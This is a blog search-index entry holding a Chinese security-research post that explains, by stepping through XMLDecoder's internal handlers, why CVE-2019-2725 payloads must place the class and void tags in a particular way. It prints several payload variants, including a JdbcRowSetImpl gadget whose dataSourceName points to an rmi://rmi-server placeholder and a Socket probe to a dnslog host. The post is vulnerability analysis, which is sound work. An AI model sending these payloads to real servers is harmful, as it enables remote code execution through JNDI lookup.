<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XMLDecoder 反序列化之 class 标签</title>
    <link href="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/"/>
    <url>/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<p>在学习 CVE-2019-2725 时看到文章中说构造的 xml 需要在一行才能成功</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.dnslog.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么为什么需要这样构造呢，这跟<code>calss</code>标签特性有关，我们先来看下在 class 开始标签与 string 开始标签之间换行会怎样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样使用 XMLDecoder 反序列化时会报错找不到这个类</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/1.png" class=""><p>跟踪调试，在解析 class 标签后，会调用<code>com.sun.beans.decoder.DocumentHandler#characters</code>方法，来添加标签中的字符数据</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/2.png" class=""><p>可以看到这里将换行符和空格添加了进去(因为 xml 换行时编辑器会自动进行缩进，所以带了空格，如果把缩进删除，则只添加换行)</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/3.png" class=""><p>解析 string 闭合标签时，会进入<code>com.sun.beans.decoder.ElementHandler#endElement</code>方法中</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/4.png" class=""><p>append 之后就变成了<code>\n    java.net.Socket</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/5.png" class=""><p>在解析 void 闭合标签时，会进入到<code>com.sun.beans.decoder.ObjectElementHandler#getValueObject</code>方法，跟进<code>getContextBean()</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/6.png" class=""><p>最终会来到<code>com.sun.beans.decoder.ClassElementHandler#getValue</code>方法中，可以很清晰看出为什么会报ClassNotFoundException</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/7.png" class=""><p>那么如果改成如下这样呢？</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依然会报找不到类的错误</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/8.png" class=""><p>只要保证如下这样就可以了，因为 class 标签只会将其标签下的字符和其直接 string 子标签中的字符添加到与之对应的<code>this.sb</code>中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那为什么包含类的 string 标签后面一定要添加<code>void</code>标签呢？如果去掉后面的 void 标签，直接跟其他标签行不行？上面的 xml 好理解，如果将 void 标签去掉，那么这些 string 标签中的字符就会直接拼接在一起了，导致成如下这样</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/9.png" class=""><p>那么如果是下面这个 xml 呢？这个也是<code>CVE-2019-2725</code>中用到的一个 poc </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSourceName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://rmi-server/xx<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autoCommit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果将 void 标签去掉，后面直接跟 property 标签呢，这样也杜绝了找不到类的问题</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSourceName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://rmi-server/xx<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autoCommit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结果会报如下错误，简单来说就是在类中找不到 property 标签指定的方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/10.png" class=""><p>我们来跟踪调试一下</p><p>在解析 property 标签中的第一个 string 闭合标签时先进入<code>com.sun.beans.decoder.ElementHandler#endElement</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/11.png" class=""><p>继续往下跟进，进入<code>com.sun.beans.decoder.PropertyElementHandler#setValue</code>方法中，在这里要先调用<code>getContextBean</code>方法，来获取 property 父标签的 value</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/12.png" class=""><p>先跟进<code>com.sun.beans.decoder.ElementHandler#getContextBean</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/13.png" class=""><p>这里会调用<code>com.sun.beans.decoder.StringElementHandler#getValueObject</code>，因为 ClassElementHandler 没有这个方法，所以会调用其父类 StringElementHandler 的 getValueObject 方法，在这里面先调用<code>com.sun.beans.decoder.StringElementHandler#getValue</code>方法查找类，然后返回 this.value </p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/14.png" class=""><p>然后回到 getContextBean 方法中，返回 value 值</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/15.png" class=""><p>然后来到<code>com.sun.beans.decoder.PropertyElementHandler#setPropertyValue</code>方法，在<code>getContextBean</code>方法中返回的是个 Class 实例，并不是 JdbcRowSetImpl 类的实例，那么这里再 getClass 获取到的自然就是<code>java.lang.Class</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/16.png" class=""><p>跟进<code>com.sun.beans.decoder.PropertyElementHandler#findSetter</code>方法，该方法就是用来查找指定类与 property 标签中 name 属性值对应的 setter 方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/17.png" class=""><p>通过<code>com.sun.beans.decoder.PropertyElementHandler#getProperty</code>方法来进行搜索，这里传入的是<code>java.lang.Class</code>自然不可能查找到<code>setDataSourceName</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/18.png" class=""><p>那为什么添加 void 标签后就可以呢，原因在于<code>getValueObject</code>方法的不同，添加后这里 property 标签的父标签就变成了 void</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/19.png" class=""><p>VoidElementHandler 类没有<code>getValueObject</code>方法，所以会调用其间接父类 NewElementHandler 的无参 <code>getValueObject</code>方法，然后在这里又会调用到其直接父类 ObjectElementHandler 的 getValueObject 方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/20.png" class=""><p>在<code>com.sun.beans.decoder.ObjectElementHandler#getValueObject</code>方法中也是先调用<code>com.sun.beans.decoder.NewElementHandler#getContextBean</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/21.png" class=""><p>但是在该方法的下面会通过反射 new 一个 JdbcRowSetImpl 实例</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/22.png" class=""><p>此时在<code>com.sun.beans.decoder.PropertyElementHandler#setPropertyValue</code>方法中 getClass 获得的就是<code>com.sun.rowset.JdbcRowSetImpl</code>类而不是<code>java.lang.Class</code>了</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/23.png" class="">]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
